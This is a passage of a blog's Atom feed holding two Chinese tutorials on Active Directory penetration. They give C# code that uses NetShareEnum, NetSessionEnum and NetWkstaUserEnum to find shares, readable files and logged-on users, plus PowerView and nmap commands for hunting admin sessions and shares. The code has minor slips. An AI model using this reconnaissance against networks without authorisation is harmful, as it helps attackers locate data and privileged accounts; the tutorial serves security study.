<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RcoIl的窝</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://rcoil.me/"/>
  <updated>2019-10-23T02:04:38.178Z</updated>
  <id>https://rcoil.me/</id>
  
  <author>
    <name>RcoIl</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【域渗透】获取域内机器共享</title>
    <link href="https://rcoil.me/2019/10/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E6%9C%BA%E5%99%A8%E5%85%B1%E4%BA%AB/"/>
    <id>https://rcoil.me/2019/10/【域渗透】获取域内机器共享/</id>
    <published>2019-10-23T08:06:48.000Z</published>
    <updated>2019-10-23T02:04:38.178Z</updated>
    
    <content type="html"><![CDATA[<p>在域内遇到瓶颈时，不妨看看域内机器开放的共享，获取有些收获。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>大多数内网渗透总结在提到使用 <code>WinAPI枚举系统</code> 只是讲述了利用 <code>NetSessionEnum</code> 来找寻<code>登陆 sessions</code>， 利用 <code>NetWkstaUserEnum</code> 来枚举登陆的用户，利用 <code>NetShareEnum</code> 来找寻共享，但却未说明其原型理论。由于前篇文章 <a href="[https://rcoil.me/2019/10/【域渗透】域内会话收集/](https://rcoil.me/2019/10/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9F%9F%E5%86%85%E4%BC%9A%E8%AF%9D%E6%94%B6%E9%9B%86/">【域渗透】域内会话收集</a>) 已经针对 <code>NetSessionEnum</code> 和 <code>NetWkstaUserEnum</code>  进行说明，所以本文是对 <code>NetShareEnum</code> 做一个概述及应用的补充。</p><h2 id="0x01-NetShareEnum-函数"><a href="#0x01-NetShareEnum-函数" class="headerlink" title="0x01 NetShareEnum 函数"></a>0x01 NetShareEnum 函数</h2><p>以当前权限检索有关服务器上每个共享资源的信息。还可以使用 <a href="https://docs.microsoft.com/windows/desktop/api/winnetwk/nf-winnetwk-wnetenumresourcea" target="_blank" rel="noopener">WNetEnumResource</a> 函数来检索资源信息。但是，<strong>WNetEnumResource</strong>不会枚举隐藏的共享或连接到共享的用户。</p><p>该函数原型为：</p><p><img src="/image/【域渗透】获取域内机器共享/blog_2019-10-16_17-15-43.png" alt=""></p><p>它需要 7 个参数。</p><ul><li><strong>servername：</strong>指向一个字符串的指针，该字符串指定要在其上执行该功能的远程服务器的DNS或NetBIOS名称。如果此参数为<strong>NULL</strong>，则使用本地计算机</li><li><strong>level：</strong>指定数据的信息级别。</li><li><strong>bufptr：</strong>向接收数据的缓冲区的指针。该数据的格式取决于 <em>level</em> 参数的值。</li><li><strong>prefmaxlen：</strong>指定返回数据的首选最大长度，以字节为单位。如果指定<strong>MAX_PREFERRED_LENGTH</strong>，则该函数分配数据所需的内存量。如果在此参数中指定另一个值，则它可以限制函数返回的字节数。如果缓冲区大小不足以容纳所有条目，则该函数返回<strong>ERROR_MORE_DATA</strong>。</li><li><strong>entriesread：</strong>指向一个值的指针，该值接收实际枚举的元素数。</li><li><strong>totalentries：</strong>指向一个值的值，该值接收可能已经枚举的条目总数。</li><li><strong>resume_handle：</strong>指向包含恢复句柄的值的指针，该恢复句柄用于继续现有的共享搜索。</li></ul><p>而此 API 的调用示例为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> server = <span class="string">"rcoil.me"</span>;</span><br><span class="line"><span class="keyword">int</span> ret = NetShareEnum(server, <span class="number">1</span>, <span class="keyword">ref</span> bufPtr, MAX_PREFERRED_LENGTH, <span class="keyword">ref</span> entriesread, <span class="keyword">ref</span> totalentries, <span class="keyword">ref</span> resume_handle);</span><br></pre></td></tr></table></figure><p>它会返回如下内容：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shi1_netname - ADMIN$</span><br><span class="line">shi1_remark - Remote management</span><br><span class="line">shi1_netname - C$</span><br><span class="line">shi1_remark -<span class="built_in"> Default </span>share</span><br><span class="line">shi1_netname - SYSVOL</span><br><span class="line">shi1_remark - Logon<span class="built_in"> server </span>share</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure><p>关键源码如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 返回指定计算机所开放的共享，并返回 SHARE_INFO_1[] 数组结构</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> https://www.pinvoke.net/default.aspx/netapi32/netshareenum.html</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="Server"&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SHARE_INFO_1[] <span class="title">EnumNetShares</span>(<span class="params"><span class="keyword">string</span> Server</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    List&lt;SHARE_INFO_1&gt; ShareInfos = <span class="keyword">new</span> List&lt;SHARE_INFO_1&gt;();</span><br><span class="line">    <span class="keyword">int</span> entriesread = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> totalentries = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> resume_handle = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> nStructSize = Marshal.SizeOf(<span class="keyword">typeof</span>(SHARE_INFO_1));</span><br><span class="line">    IntPtr bufPtr = IntPtr.Zero;</span><br><span class="line">    StringBuilder server = <span class="keyword">new</span> StringBuilder(Server);</span><br><span class="line">    <span class="keyword">int</span> ret = NetShareEnum(server, <span class="number">1</span>, <span class="keyword">ref</span> bufPtr, MAX_PREFERRED_LENGTH, <span class="keyword">ref</span> entriesread, <span class="keyword">ref</span> totalentries, <span class="keyword">ref</span> resume_handle);</span><br><span class="line">    <span class="keyword">if</span> (ret == NERR_Success)</span><br><span class="line">    &#123;</span><br><span class="line">        IntPtr currentPtr = bufPtr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; entriesread; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            SHARE_INFO_1 shi1 = (SHARE_INFO_1)Marshal.PtrToStructure(currentPtr, <span class="keyword">typeof</span>(SHARE_INFO_1));</span><br><span class="line">            ShareInfos.Add(shi1);</span><br><span class="line">            currentPtr += nStructSize;</span><br><span class="line">        &#125;</span><br><span class="line">        NetApiBufferFree(bufPtr);</span><br><span class="line">        <span class="keyword">return</span> ShareInfos.ToArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ShareInfos.Add(<span class="keyword">new</span> SHARE_INFO_1(<span class="string">"ERROR="</span> + ret.ToString(), <span class="number">10</span>, <span class="keyword">string</span>.Empty));</span><br><span class="line">        <span class="keyword">return</span> ShareInfos.ToArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>演示结果：</p><p><img src="/image/【域渗透】获取域内机器共享/blog_2019-10-16_17-29-03.png" alt=""></p><h2 id="0X02-进一步拓展"><a href="#0X02-进一步拓展" class="headerlink" title="0X02 进一步拓展"></a>0X02 进一步拓展</h2><h3 id="2-1、判断是否可读"><a href="#2-1、判断是否可读" class="headerlink" title="2.1、判断是否可读"></a>2.1、判断是否可读</h3><p>判断可读，是根据当前用户权限进行判断的。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> path = String.Format(<span class="string">"\\\\&#123;0&#125;\\&#123;1&#125;"</span>, computer, share.shi1_netname);</span><br><span class="line"><span class="keyword">var</span> files = System.IO.Directory.GetFiles(path);</span><br></pre></td></tr></table></figure><p>直接根据以上方法进行访问测试即可。效果如下</p><p><img src="/image/【域渗透】获取域内机器共享/blog_2019-10-16_17-48-07.png" alt=""></p><p>接下来就是以当前权限，对可访问的共享进行遍历即可。获取文件名、文件大小，再进行下一步的筛选。</p><h3 id="2-2、遍历"><a href="#2-2、遍历" class="headerlink" title="2.2、遍历"></a>2.2、遍历</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 对路径进行遍历</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="info"&gt;</span>提供的根路径<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ListFiles</span>(<span class="params">FileSystemInfo info</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!info.Exists) <span class="keyword">return</span>;</span><br><span class="line">  DirectoryInfo dir = info <span class="keyword">as</span> DirectoryInfo;</span><br><span class="line">  <span class="comment">//不是目录</span></span><br><span class="line">  <span class="keyword">if</span> (dir == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    FileSystemInfo[] files = dir.GetFileSystemInfos();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; files.Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      FileInfo file = files[i] <span class="keyword">as</span> FileInfo;</span><br><span class="line">      <span class="comment">//是文件</span></span><br><span class="line">      <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">        Console.WriteLine(file.FullName);</span><br><span class="line">      <span class="comment">//对于子目录，进行递归调用</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        ListFiles(files[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/【域渗透】获取域内机器共享/Blog_2019-10-16_22-27-27.png" alt=""></p><h2 id="0x03-现有工具"><a href="#0x03-现有工具" class="headerlink" title="0x03 现有工具"></a>0x03 现有工具</h2><ul><li>net 命令</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net view \\ip # 查询指定<span class="built_in"> IP </span>共享</span><br><span class="line">net sharp # 查看<span class="built_in"> SMB </span>指向的路径[即共享]</span><br></pre></td></tr></table></figure><ul><li>Nmap</li></ul><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smb-<span class="class"><span class="keyword">enum</span>-<span class="title">shares</span>.<span class="title">nse</span> <span class="comment"># 遍历远程主机的共享目录</span></span></span><br></pre></td></tr></table></figure><ul><li>nbtscan</li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan <span class="number">192.10</span><span class="number">.20</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><ul><li>powerview</li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Invoke-StealthUserHunter # 查找域中 domain admins 共享源机器(session <span class="keyword">from</span>)</span><br><span class="line">Invoke-Netview # 检索主机建立的共享会话</span><br><span class="line">Invoke-NetviewThreaded # 检索主机建立的共享会话</span><br><span class="line">Invoke-ShareFinder # 查找主机建立的共享会话</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在域内遇到瓶颈时，不妨看看域内机器开放的共享，获取有些收获。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】域内会话收集</title>
    <link href="https://rcoil.me/2019/10/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9F%9F%E5%86%85%E4%BC%9A%E8%AF%9D%E6%94%B6%E9%9B%86/"/>
    <id>https://rcoil.me/2019/10/【域渗透】域内会话收集/</id>
    <published>2019-10-01T03:13:20.000Z</published>
    <updated>2019-09-27T02:54:15.748Z</updated>
    
    <content type="html"><![CDATA[<p>2018 年3月，<code>BooldHound</code> 发表了篇博文  <a href="https://blog.cptjesus.com/posts/sharphoundtargeting" target="_blank" rel="noopener">SharpHound: Target Selection and API Usage</a> 。这里面介绍了一些关于收集 <code>BooldHound</code> 所需信息的收集方法及所使用的 <code>API</code>。而本文主要介绍两个关于收集会话信息的 <code>API</code>及利用远程注册表的方法（翻译+补充），也是对<a href="https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF/">【域渗透】获取域环境内用户登录信息</a> 的一个补充。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>使用过<code>BooldHound</code> 的朋友都知道，它所呈现出来非常多的信息，基本能满足日常信息收集所需的数据，但是之前使用的时候，就很惊讶，它们的会话关系数据来源是怎么来的，所幸后来官方给了解释。</p><h2 id="0x01-会话收集"><a href="#0x01-会话收集" class="headerlink" title="0x01 会话收集"></a>0x01 会话收集</h2><p><code>BooldHound</code> 公开了三种不同的查询计算机会话信息的方法，都是从检查 445 端口开始的。</p><h3 id="1）、NetSessionEnum"><a href="#1）、NetSessionEnum" class="headerlink" title="1）、NetSessionEnum"></a>1）、NetSessionEnum</h3><p>它不允许直接查询是谁登陆了此工作站，但是它允许查询是谁在访问此工作站的网络资源（例如文件共享）时所创建的网络会话，从而知道来自何处。当然这里最好的查询对象是域控 + 文件共享服务器。此函数不需要高权限。</p><p>该函数原型是：</p><p><img src="/image/【域渗透】域内会话收集/Blog_2019-09-19_12-34-12.png" alt=""></p><p>它需要 9 个参数，我们只需了解其中的 5 个参数即可：</p><ul><li><strong>servername：</strong>该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为<code>NULL</code>，则使用本地计算机。</li><li><strong>UncClientName：</strong>该字符串指定要为其返回信息的计算机会话的名称。如果此参数为 <code>NULL</code>，则 <code>NetSessionEnum</code> 将返回服务器上所有计算机会话的信息。</li><li><strong>username：</strong>该字符串指定要为其返回信息的用户的名称。如果此参数为 <code>NULL</code>，则 <code>NetSessionEnum</code> 将返回所有用户的信息。</li><li><strong>level：</strong>指定数据的信息级别。</li><li><strong>bufptr：</strong>指向接收数据的缓冲区的指针。此数据的格式取决于 <code>level</code> 参数的值。此缓冲区由系统分配，必须使用 <a href="https://docs.microsoft.com/windows/desktop/api/lmapibuf/nf-lmapibuf-netapibufferfree" target="_blank" rel="noopener">NetApiBufferFree</a> 函数释放 。请注意，即使函数因 <code>ERROR_MORE_DATA</code> 而失败，也必须释放缓冲区。</li></ul><p>而此 API 的调用示例为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> server = <span class="string">"rcoil.me"</span></span><br><span class="line">nStatus = NetSessionEnum(server, <span class="literal">null</span>, <span class="literal">null</span>, <span class="number">10</span>, <span class="keyword">out</span> Bufptr, <span class="number">-1</span>, <span class="keyword">ref</span> dwEntriesread, <span class="keyword">ref</span> dwTotalentries, <span class="keyword">ref</span> dwResume_handle);</span><br></pre></td></tr></table></figure><p>其中，<code>level</code> 的数值为10，是唯一以未经身份验证的方式获取所需数据的级别。</p><p>它会返回如下内容：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sesi10_cname - <span class="number">192.10</span><span class="number">.22</span><span class="number">.102</span></span><br><span class="line">sesi10_username - RcoIl</span><br><span class="line">sesi10_time - <span class="number">0</span></span><br><span class="line">sesi10_idle_time - <span class="number">0</span></span><br></pre></td></tr></table></figure><p>关键源码如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 返回指定服务器的所有 SESSIONS。返回 SESSION_INFO_10 结构的数组。</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> https://www.pinvoke.net/default.aspx/netapi32/NetSessionEnum.html</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="server"&gt;</span>默认所有域内机器，隐形目标：域控制器+共享服务器<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span>SESSION_INFO_10 STRUCTURE ARRAY<span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SESSION_INFO_10[] <span class="title">EnumSessions</span>(<span class="params"><span class="keyword">string</span> server</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  IntPtr Bufptr;</span><br><span class="line">  <span class="keyword">int</span> nStatus = <span class="number">0</span>;</span><br><span class="line">  Int32 dwEntriesread = <span class="number">0</span>, dwTotalentries = <span class="number">0</span>, dwResume_handle = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  Bufptr = (IntPtr)Marshal.SizeOf(<span class="keyword">typeof</span>(SESSION_INFO_10));</span><br><span class="line">  SESSION_INFO_10[] results = <span class="keyword">new</span> SESSION_INFO_10[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    nStatus = NetSessionEnum(server, <span class="literal">null</span>, <span class="literal">null</span>, <span class="number">10</span>, <span class="keyword">out</span> Bufptr, <span class="number">-1</span>, <span class="keyword">ref</span> dwEntriesread, <span class="keyword">ref</span> dwTotalentries, <span class="keyword">ref</span> dwResume_handle);</span><br><span class="line">    results = <span class="keyword">new</span> SESSION_INFO_10[dwEntriesread];</span><br><span class="line">    <span class="keyword">if</span> (nStatus == (<span class="keyword">int</span>)NERR.ERROR_MORE_DATA || nStatus == (<span class="keyword">int</span>)NERR.NERR_Success)</span><br><span class="line">    &#123;</span><br><span class="line">      Int32 p = Bufptr.ToInt32();</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwEntriesread; i++)</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">        SESSION_INFO_10 si = (SESSION_INFO_10)Marshal.PtrToStructure(<span class="keyword">new</span> IntPtr(p), <span class="keyword">typeof</span>(SESSION_INFO_10));</span><br><span class="line">        results[i] = si;</span><br><span class="line">        p += Marshal.SizeOf(<span class="keyword">typeof</span>(SESSION_INFO_10));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//NetApiBufferFree(BufPtr);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 释放先前从进程的非托管内存分配的内存。</span></span><br><span class="line">    Marshal.FreeHGlobal(Bufptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (nStatus == (<span class="keyword">int</span>)NERR.ERROR_MORE_DATA);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2）、NetWkstaUserEnum"><a href="#2）、NetWkstaUserEnum" class="headerlink" title="2）、NetWkstaUserEnum"></a>2）、NetWkstaUserEnum</h3><p>该 <strong>NetWkstaUserEnum</strong> 功能可以列出当前登录到该工作站的所有用户的信息。此列表包括交互式、服务和批量登录。此函数需要主机的管理权限或这域管权限，适用于自检使用。</p><p>该函数原型是：</p><p><img src="/image/【域渗透】域内会话收集/Blog_2019-09-19_14-38-02.png" alt=""></p><p>它需要 7个参数，我们只需了解其中的 3 个参数即可：</p><ul><li><strong>servername：</strong>该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为<code>NULL</code>，则使用本地计算机。</li><li><strong>level：</strong>指定数据的信息级别。</li><li><strong>bufptr：</strong>指向接收数据的缓冲区的指针。此数据的格式取决于 <code>level</code> 参数的值。此缓冲区由系统分配，必须使用 <a href="https://docs.microsoft.com/windows/desktop/api/lmapibuf/nf-lmapibuf-netapibufferfree" target="_blank" rel="noopener">NetApiBufferFree</a> 函数释放 。请注意，即使函数因 <code>ERROR_MORE_DATA</code> 而失败，也必须释放缓冲区。</li></ul><p> 而此 API 的调用示例为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> server = <span class="string">"rcoil.me"</span></span><br><span class="line">nStatus = NetWkstaUserEnum(server, <span class="number">1</span>, <span class="keyword">out</span> Bufptr, <span class="number">32768</span>, <span class="keyword">out</span> dwEntriesread, <span class="keyword">out</span> dwTotalentries, <span class="keyword">ref</span> dwResumehandle);</span><br></pre></td></tr></table></figure><p>其中，<code>level</code> 的数值为1，是因为 1 比 0 返回的数据多，因此选择了 1。</p><p>它会返回如下内容：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wkui1_username - Administrator</span><br><span class="line">wkui1_logon_domain - RDC_1</span><br><span class="line">wkui1_oth_domains -</span><br><span class="line">wkui1_logon_server - RCOIL</span><br></pre></td></tr></table></figure><p>关键源码如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> API 调用的第二个参数是 API 调用的级别，其中 1 返回的数据多于 0，所以选择 1进行测试</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> https://www.pinvoke.net/default.aspx/netapi32/netwkstauserenum.html</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="server"&gt;</span>默认所有域内机器，隐形目标：域控制器+共享服务器<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> WKSTA_USER_INFO_1[] <span class="title">EnumWkstaUser</span>(<span class="params"><span class="keyword">string</span> server</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  IntPtr Bufptr;</span><br><span class="line">  <span class="keyword">int</span> nStatus = <span class="number">0</span>;</span><br><span class="line">  Int32 dwEntriesread = <span class="number">0</span>, dwTotalentries = <span class="number">0</span>, dwResumehandle = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  Bufptr = (IntPtr)Marshal.SizeOf(<span class="keyword">typeof</span>(WKSTA_USER_INFO_1));</span><br><span class="line">  WKSTA_USER_INFO_1[] results = <span class="keyword">new</span> WKSTA_USER_INFO_1[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    nStatus = NetWkstaUserEnum(server, <span class="number">1</span>, <span class="keyword">out</span> Bufptr, <span class="number">32768</span>, <span class="keyword">out</span> dwEntriesread, <span class="keyword">out</span> dwTotalentries, <span class="keyword">ref</span> dwResumehandle);</span><br><span class="line">    results = <span class="keyword">new</span> WKSTA_USER_INFO_1[dwEntriesread];</span><br><span class="line">    <span class="keyword">if</span> ((nStatus == NERR_SUCCESS) || (nStatus == ERROR_MORE_DATA))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (dwEntriesread &gt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        IntPtr pstruct = Bufptr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwEntriesread; i++)</span><br><span class="line">        &#123;</span><br><span class="line">          WKSTA_USER_INFO_1 wui1 = (WKSTA_USER_INFO_1)Marshal.PtrToStructure(pstruct, <span class="keyword">typeof</span>(WKSTA_USER_INFO_1));</span><br><span class="line">          results[i] = wui1;</span><br><span class="line">          pstruct = (IntPtr)((<span class="keyword">int</span>)pstruct + Marshal.SizeOf(<span class="keyword">typeof</span>(WKSTA_USER_INFO_1)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Bufptr != IntPtr.Zero)</span><br><span class="line">      NetApiBufferFree(Bufptr);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">while</span> (nStatus == ERROR_MORE_DATA);</span><br><span class="line">  <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 